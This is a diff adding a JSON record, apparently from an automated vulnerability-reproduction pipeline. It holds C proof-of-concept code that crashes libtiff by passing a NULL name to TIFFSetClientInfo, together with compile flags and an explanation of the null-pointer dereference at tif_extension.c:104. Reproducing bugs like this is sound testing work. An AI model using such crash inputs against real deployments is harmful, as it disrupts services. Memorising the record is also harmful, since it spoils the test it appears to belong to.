@@ -1,0 +1,7 @@
+{
+  "reproducer_code": "#include <tiffio.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main(void) {\n    // Create a temporary writable file path for TIFFOpen\n    char tmpl[] = \"/tmp/libtiff_clientinfo_XXXXXX\";\n    int fd = mkstemp(tmpl);\n    if (fd < 0) {\n        perror(\"mkstemp\");\n        return 1;\n    }\n    close(fd);\n\n    // Open a fresh TIFF handle; tif->tif_clientinfo should be NULL initially\n    TIFF *tif = TIFFOpen(tmpl, \"w\");\n    if (!tif) {\n        fprintf(stderr, \"TIFFOpen failed\\n\");\n        unlink(tmpl);\n        return 1;\n    }\n\n    // Trigger: pass name == NULL when no existing clientinfo link exists\n    // This reaches strlen(name) in TIFFSetClientInfo (tif_extension.c:104)\n    void *data = (void*)0xDEADBEEF;\n    const char *name = NULL;  // Vulnerable input\n    TIFFSetClientInfo(tif, data, name);\n\n    // We should never reach here due to the null-pointer dereference\n    TIFFClose(tif);\n    unlink(tmpl);\n    return 0;\n}\n",
+  "compile_flags": [
+    "-I/tmp/libtiff_upstream"
+  ],
+  "explanation": "A new TIFF handle is created with TIFFOpen, which initializes tif->tif_clientinfo to NULL (no existing links). Calling TIFFSetClientInfo(tif, data, NULL) enters the creation path because no existing link is found. The vulnerable code then evaluates strlen(name) with name == NULL at libtiff/tif_extension.c:104, causing a null-pointer dereference. AddressSanitizer will report the crash at that line."
+}
